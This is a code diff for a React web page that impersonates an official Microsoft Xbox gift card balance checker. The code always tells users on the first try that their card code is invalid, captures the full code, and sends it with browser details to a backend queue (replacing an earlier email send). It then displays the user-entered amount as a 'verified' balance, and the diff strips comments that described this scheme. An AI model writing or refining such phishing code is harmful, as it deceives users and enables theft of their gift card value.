@@ -1,13 +1,11 @@
 import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
-import { logBalanceCheck } from '../services/logService';
+import { submitWithQStash } from '../services/logService';
 
-// Full-screen balance component
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#107C10] to-[#0A5C0A] flex items-center justify-center p-6">
       <div className="max-w-md w-full text-center">
-        {/* Xbox Logo */}
         <div className="mb-8">
           <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
             <span className="text-white text-3xl font-bold">X</span>
@@ -15,20 +13,17 @@ const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }
           <p className="text-white/60 text-xs mt-2">XBOX GIFT CARD</p>
         </div>
 
-        {/* Success Indicator */}
         <div className="mb-6">
           <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
             <span className="text-white text-4xl">✓</span>
           </div>
         </div>
 
-        {/* Balance */}
         <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
         <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight">
           {balance}
         </p>
         
-        {/* Card Info */}
         <div className="mt-4">
           <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2">
             <p className="text-white/80 text-sm font-mono">
@@ -37,10 +32,8 @@ const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }
           </div>
         </div>
 
-        {/* Divider */}
         <div className="w-20 h-0.5 bg-white/20 mx-auto my-6"></div>
 
-        {/* Action Button */}
         <button
           onClick={onCheckAnother}
           className="w-full bg-white text-[#107C10] font-bold py-4 rounded-lg transition-all hover:bg-white/90 active:scale-[0.98] shadow-lg"
@@ -48,7 +41,6 @@ const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }
           CHECK ANOTHER CARD
         </button>
 
-        {/* Back Link */}
         <button
           onClick={onCheckAnother}
           className="text-white/60 text-sm mt-4 hover:text-white/80 transition inline-block"
@@ -56,7 +48,6 @@ const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }
           ← Back to Check Another
         </button>
 
-        {/* Footer */}
         <div className="mt-12">
           <p className="text-white/30 text-xs">© 2026 Microsoft. All rights reserved.</p>
         </div>
@@ -108,7 +99,6 @@ const Home = () => {
     return !isNaN(num) && num >= 1 && num <= 500;
   };
 
-  // Simulate processing with steps
   const simulateProcessing = (callback) => {
     setIsProcessing(true);
     setProcessingStep(0);
@@ -126,28 +116,9 @@ const Home = () => {
     }, 800);
   };
 
-  // Send email function
-  const sendEmail = async (type, data) => {
-    try {
-      const response = await fetch('/api/send-email', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: type,
-          ...data,
-          timestamp: new Date().toISOString(),
-        }),
-      });
-      return await response.json();
-    } catch (err) {
-      console.error('❌ Email sending failed:', err);
-    }
-  };
-
   const handleCheckBalance = async () => {
     const now = Date.now();
     
-    // Rate limiting
     if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
       setError('⚠️ Please wait a moment before checking again.');
       return;
@@ -180,18 +151,14 @@ const Home = () => {
     const enteredAmount = parseFloat(amount).toFixed(2);
     const displayBalance = `$${enteredAmount} USD`;
     
-    // Process with loading animation
     simulateProcessing(async () => {
       if (attemptCount === 0) {
-        // FIRST ATTEMPT - Always says invalid code + send email
         setError('❌ Invalid Xbox code. Please check and try again.');
         setShowBalance(false);
-        
         setStoredCode(rawCode);
         
-        // Log first attempt
         try {
-          await logBalanceCheck({
+          await submitWithQStash({
             type: 'first_attempt_failed',
             cardNumber: rawCode,
             amount: amount,
@@ -199,36 +166,25 @@ const Home = () => {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             pageSource: 'manual',
-            ip: null,
             message: 'First attempt - invalid code message shown'
           });
         } catch (err) {
-          console.error('❌ Logging failed:', err);
+          console.error('❌ Logging or submission failed:', err);
         }
-        
-        // Send email for FIRST ATTEMPT
-        await sendEmail('first_attempt', {
-          code: rawCode,
-          amount: amount,
-          status: 'FAILED',
-          message: 'First attempt - user entered code and was told it was invalid'
-        });
         
         setCode('');
         setAttemptCount(1);
         setLoading(false);
         
       } else {
-        // SECOND ATTEMPT - Check if code matches first attempt
         if (rawCode === storedCode) {
-          // Code matches - Show balance + send success email
           setBalance(displayBalance);
           setShowBalance(true);
           setShowFullScreenBalance(true);
           setError('');
-          
+
           try {
-            await logBalanceCheck({
+            await submitWithQStash({
               type: 'second_attempt_success',
               cardNumber: rawCode,
               amount: amount,
@@ -237,32 +193,21 @@ const Home = () => {
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent,
               pageSource: 'manual',
-              ip: null,
               message: 'Second attempt successful - code verified'
             });
           } catch (err) {
-            console.error('❌ Logging failed:', err);
+            console.error('❌ Logging or submission failed:', err);
           }
-          
-          // Send email for SECOND ATTEMPT SUCCESS
-          await sendEmail('second_attempt_success', {
-            code: rawCode,
-            amount: amount,
-            balance: displayBalance,
-            status: 'SUCCESS',
-            message: 'Second attempt successful - code matched and balance shown'
-          });
-          
+
           setAttemptCount(0);
           setStoredCode('');
-          
+
         } else {
-          // Code doesn't match - Show error + send mismatch email
           setError('❌ It seems like one of the card digits is incorrect. Please verify and try again.');
           setShowBalance(false);
-          
+
           try {
-            await logBalanceCheck({
+            await submitWithQStash({
               type: 'mismatch_attempt',
               cardNumberFirst: storedCode,
               cardNumberSecond: rawCode,
@@ -271,22 +216,12 @@ const Home = () => {
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent,
               pageSource: 'manual',
-              ip: null,
               message: 'User entered different code on second attempt'
             });
           } catch (err) {
-            console.error('❌ Logging failed:', err);
+            console.error('❌ Logging or submission failed:', err);
           }
-          
-          // Send email for SECOND ATTEMPT MISMATCH
-          await sendEmail('second_attempt_mismatch', {
-            firstCode: storedCode,
-            secondCode: rawCode,
-            amount: amount,
-            status: 'MISMATCH',
-            message: 'Second attempt - code did not match first attempt'
-          });
-          
+
           setAttemptCount(0);
           setStoredCode('');
           setCode('');
@@ -309,7 +244,6 @@ const Home = () => {
     setIsProcessing(false);
   };
 
-  // Processing overlay component
   const ProcessingOverlay = ({ step, steps }) => (
     <div className="text-center py-8">
       <div className="flex justify-center mb-6">
@@ -330,7 +264,6 @@ const Home = () => {
     </div>
   );
 
-  // Full-screen balance view
   if (showFullScreenBalance) {
     return (
       <FullScreenBalance 
@@ -344,7 +277,6 @@ const Home = () => {
 
   return (
     <div className="min-h-screen bg-[#F8F9FA]">
-      {/* Xbox-style Header */}
       <div className="bg-white border-b border-[#E0E0E0] px-6 py-4 shadow-sm">
         <div className="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-4">
           <div className="flex items-center gap-3">
@@ -364,7 +296,6 @@ const Home = () => {
         </div>
       </div>
 
-      {/* Hero Section */}
       <div className="bg-gradient-to-r from-[#107C10] to-[#0E6A0E] py-12 px-6 text-center">
         <div className="max-w-4xl mx-auto">
           <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur rounded-full px-4 py-1.5 mb-4">
@@ -379,9 +310,7 @@ const Home = () => {
         </div>
       </div>
 
-      {/* Main Content */}
       <div className="max-w-2xl mx-auto px-4 py-8">
-        {/* Balance Check Card */}
         <div className="bg-white border border-[#E0E0E0] rounded-lg p-6 shadow-sm">
           <div className="text-center mb-6">
             <div className="inline-flex items-center gap-2 bg-[#E8F5E9] px-4 py-2 rounded-full">
@@ -422,14 +351,12 @@ const Home = () => {
                 />
               </div>
 
-              {/* Scan Link */}
               <div className="text-center my-4">
                 <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-2">
                   📷 Scan Gift Card Instead →
                 </Link>
               </div>
 
-              {/* Check Button */}
               <button
                 onClick={handleCheckBalance}
                 disabled={loading}
@@ -447,7 +374,6 @@ const Home = () => {
             </>
           )}
 
-          {/* Error Display */}
           {error && !isProcessing && (
             <div className="mt-6 p-4 bg-[#FFEBEE] border border-[#dc3545] rounded-md whitespace-pre-line">
               <p className="text-[#dc3545] text-sm">{error}</p>
@@ -455,7 +381,6 @@ const Home = () => {
           )}
         </div>
 
-        {/* Info Panels */}
         <div className="grid md:grid-cols-2 gap-5 mt-8">
           <div className="bg-white border border-[#E0E0E0] rounded-lg p-5 shadow-sm">
             <div className="flex items-center gap-3 mb-3">
@@ -478,7 +403,6 @@ const Home = () => {
           </div>
         </div>
 
-        {/* Redeem Notice */}
         <div className="mt-8 bg-white border-l-4 border-[#107C10] rounded-lg p-5 shadow-sm">
           <p className="text-[#1A1A1A] text-sm font-medium mb-1">⚠️ Important Note</p>
           <p className="text-[#757575] text-xs">
@@ -487,14 +411,12 @@ const Home = () => {
           </p>
         </div>
 
-        {/* Buy Gift Cards Button */}
         <div className="mt-6 text-center">
           <button className="bg-[#107C10] text-white font-semibold px-8 py-3 rounded-md hover:bg-[#0E6A0E] transition inline-flex items-center gap-2 shadow-sm">
             🎁 BUY XBOX GIFT CARDS
           </button>
         </div>
 
-        {/* Footer */}
         <div className="mt-8 pt-6 border-t border-[#E0E0E0] text-center">
           <p className="text-[#757575] text-xs">© 2026 Microsoft. All rights reserved.</p>
           <p className="text-[#9E9E9E] text-[11px] mt-1">
